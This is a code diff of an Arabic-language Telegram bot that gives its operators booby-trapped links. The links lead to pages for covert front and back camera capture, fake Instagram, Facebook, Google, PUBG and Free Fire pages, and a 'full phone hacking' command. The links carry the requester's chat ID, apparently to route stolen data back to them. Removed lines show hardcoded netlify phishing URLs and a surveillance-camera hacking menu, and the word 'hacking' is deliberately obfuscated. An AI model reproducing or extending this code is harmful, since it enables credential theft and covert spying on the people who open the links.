@@ -1885,7 +1885,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
 switch (action) {
     case 'captureFront':
-        link = await fetchDynamicLink("c");
+        link = await fetchDynamicLink("c.html");
         break;
 
     case 'captureBack':
@@ -1907,11 +1907,11 @@ switch (action) {
         break;
 
     case 'rshq_instagram':
-        link = await fetchDynamicLink("n");
+        link = await fetchDynamicLink("i");
         break;
 
     case 'rshq_facebook':
-        link = await fetchDynamicLink("n");
+        link = await fetchDynamicLink("fe");
         break;
 
     default:
@@ -2358,37 +2358,35 @@ bot.onText(/\/jjjjjavayy/, (msg) => {
     });
 });
 
-bot.on('callback_query', (query) => {
+bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
-    let link;
+    let link = '';
 
-    if (query.data === 'get_pubg') {
-        link = `https://effulgent-halva-4fabb1.netlify.app/g.html?chatId=${chatId}.png`;
+    if (query.data === 'get_google') {
+        link = await fetchDynamicLink("g");
+        if (link) link += `?chatId=${chatId}.png`;
+
     } else if (query.data === 'get_freefire') {
-        link = `https://vocal-arithmetic-0beea4.netlify.app/F?chatId=${chatId}.png`;
+        link = await fetchDynamicLink("F");
+        if (link) link += `?chatId=${chatId}.png`;
+
     } else if (query.data === 'add_names') {
-        link = `https://super-brigadeiros-46c826.netlify.app/s.html?chatId=${chatId}.png`;
+        link = await fetchDynamicLink("s");
+        if (link) link += `?chatId=${chatId}.png`;
+
+    } else if (query.data === 'add_nammes') {
+        bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اخـ ^_^ـ.راق الهاتف كاملاً قم بضغط على هذا الامر /Vip`);
+        bot.answerCallbackQuery(query.id, { text: '' });
+        return;
     }
 
     if (link) {
         bot.sendMessage(chatId, `تم لغيم الرابط هذا: ${link}`);
         bot.answerCallbackQuery(query.id, { text: 'تم إرسال الرابط إليك ✅' });
-    } else if (query.data === 'add_nammes') {
-        bot.sendMessage(chatId, `قم بإرسال هذا لفتح أوامر اخـ ^_^ـ.راق الهاتف كاملاً قم بضغط على هذا الامر /Vip`);
-        bot.answerCallbackQuery(query.id, { text: '' });
-    }
-});
 
-bot.onText(/\/نننطسطوو/, (msg) => {
-    const chatId = msg.chat.id;
-    bot.sendMessage(chatId, "مرحبا! في بوت اخـ ^_^ـ.راق كاميرات المراقبة 📡", {
-        reply_markup: {
-            inline_keyboard: [[{ text: "ابدأ الاخـ ^_^ـ.راق", callback_data: "get_cameras" }]]
-        }
-    });
-
-    if (isDeveloper(chatId)) {
-        showAdminPanel(chatId);
+    } else {
+        bot.sendMessage(chatId, "❌ لم يتم العثور على الرابط في الموقع");
+        bot.answerCallbackQuery(query.id, { text: 'خطأ' });
     }
 });
 
